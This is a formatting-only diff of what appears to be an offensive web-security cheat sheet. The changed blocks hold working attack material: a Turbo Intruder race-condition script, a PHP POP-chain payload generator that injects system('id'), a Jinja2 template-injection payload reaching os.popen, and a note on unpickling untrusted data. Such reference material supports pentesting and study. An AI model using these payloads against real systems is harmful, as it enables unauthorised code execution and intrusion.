@@ -558,6 +558,7 @@ function merge(target, source) {
 ```python
 # VULNERABLE: Unpickle user-controlled data
 import pickle
+
 data = pickle.loads(user_input)  # ← Arbitrary code execution!
 
 # EXPLOIT: Craft malicious pickle → Executes arbitrary Python code
@@ -1023,14 +1024,13 @@ wait
 ### Turbo Intruder -- Single-Packet Attack (All Requests Arrive Simultaneously)
 ```python
 def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                           concurrentConnections=1,
-                           requestsPerConnection=1,
-                           pipeline=False,
-                           engine=Engine.BURP2)
+    engine = RequestEngine(
+        endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=1, pipeline=False, engine=Engine.BURP2
+    )
     for i in range(20):
-        engine.queue(target.req, gate='race1')
-    engine.openGate('race1')  # all 20 fire in a single TCP packet
+        engine.queue(target.req, gate="race1")
+    engine.openGate("race1")  # all 20 fire in a single TCP packet
+
 
 def handleResponse(req, interesting):
     table.add(req)
@@ -1740,51 +1740,47 @@ cd phpggc
 #!/usr/bin/env python3
 # POP Chain Payload Generator Template
 
+
 class POPChain:
     def __init__(self):
         self.chain = []
-    
+
     def add_class(self, class_name, properties):
         """Add a class to the chain with controlled properties"""
-        self.chain.append({
-            'class': class_name,
-            'properties': properties
-        })
-    
+        self.chain.append({"class": class_name, "properties": properties})
+
     def serialize(self):
         """Generate PHP serialized payload"""
         payload = ""
         for item in self.chain:
             # Format: O:length:"class_name":num_properties:{properties}
-            class_name = item['class']
-            props = item['properties']
+            class_name = item["class"]
+            props = item["properties"]
             payload += f'O:{len(class_name)}:"{class_name}":{len(props)}:'
-            payload += '{'
+            payload += "{"
             for prop_name, prop_value in props.items():
                 # Handle private/protected properties
-                if prop_name.startswith('_'):
+                if prop_name.startswith("_"):
                     prop_name = f"\0{class_name}\0{prop_name.lstrip('_')}"
                 payload += f's:{len(prop_name)}:"{prop_name}";'
-                payload += f'{self.serialize_value(prop_value)}'
-            payload += '}'
+                payload += f"{self.serialize_value(prop_value)}"
+            payload += "}"
         return payload
-    
+
     def serialize_value(self, value):
         if isinstance(value, str):
             return f's:{len(value)}:"{value}";'
         elif isinstance(value, int):
-            return f'i:{value};'
+            return f"i:{value};"
         elif isinstance(value, array):
             # Serialize array
             pass
         # Add more types as needed
 
+
 # Example usage
 chain = POPChain()
-chain.add_class('VulnerableClass', {
-    'property1': 'attacker_value',
-    'property2': 'system("id")'
-})
+chain.add_class("VulnerableClass", {"property1": "attacker_value", "property2": 'system("id")'})
 print(chain.serialize())
 ```
 
@@ -1857,7 +1853,7 @@ ${7*7}           -> 49 = Freemarker / Pebble / Velocity
 
 ### Jinja2 -> RCE (Python / Flask)
 ```python
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{config.__class__.__init__.__globals__["os"].popen("id").read()}}
 ```
 
 ### Twig -> RCE (PHP / Symfony)
